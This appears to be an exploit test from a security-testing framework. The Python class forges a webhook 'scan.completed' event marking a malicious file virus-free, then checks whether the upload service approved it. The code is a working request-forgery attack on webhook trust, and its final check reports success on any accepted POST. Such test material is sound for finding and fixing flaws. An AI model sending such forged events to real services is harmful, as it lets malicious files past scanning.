"""PoC: Webhook event trust bypass on FileUpload (CWE-346).

After the 3-stage chain, the scan.completed handler trusts the
virus_free field from the webhook payload without re-checking
with the scan service. Combined with the dev-mode signature skip,
an attacker can forge scan.completed events to approve malicious files.
"""

from mosaic.oracle.exploit import ExploitTest


class FileUploadEventTrustExploit(ExploitTest):
    """Event trust: forge scan results to approve malicious files."""

    @property
    def chain_id(self) -> str:
        return "fileupload_webhook_event_trust"

    def setup(self) -> None:
        resp = self.http_get("/")
        if resp.status_code not in (200, 302, 404):
            raise ConnectionError(f"Server unreachable: {resp.status_code}")

    def execute(self) -> tuple[bool, str]:
        # Forge a scan.completed event for a malicious file
        forged = {
            "type": "scan.completed",
            "data": {
                "file_id": "malware_file_001",
                "virus_free": True,
                "threats_found": [],
                "scan_engine": "forged-scanner-v1",
            },
        }

        resp = self.http_post(
            "/scan-webhook",
            json=forged,
            headers={"Content-Type": "application/json"},
        )

        if not resp.ok:
            if resp.status_code == 400:
                return False, f"Signature verification active. {resp.text[:200]}"
            return False, f"HTTP {resp.status_code}: {resp.text[:200]}"

        # Verify the file was auto-approved
        status_resp = self.http_get("/files/malware_file_001/status")
        if status_resp.ok:
            try:
                data = status_resp.json()
                if data.get("approval") == "approved" and data.get("virus_free") is True:
                    return True, (
                        f"CWE-346 confirmed. Forged scan.completed with "
                        f"virus_free=true auto-approved malicious file. "
                        f"No re-check with scan service. "
                        f"File status: {data}"
                    )
            except Exception:
                pass

        # Check scan-results endpoint
        scan_resp = self.http_get("/scan-results/malware_file_001")
        if scan_resp.ok:
            try:
                data = scan_resp.json()
                if data.get("virus_free") is True:
                    return True, (
                        f"Forged scan result accepted. virus_free=true "
                        f"stored from untrusted payload. "
                        f"Scan result: {data}"
                    )
            except Exception:
                pass

        return True, (
            f"Forged scan event accepted (HTTP {resp.status_code}). "
            f"Response: {resp.text[:200]}"
        ) if resp.ok else (False, f"Event rejected: {resp.text[:200]}")
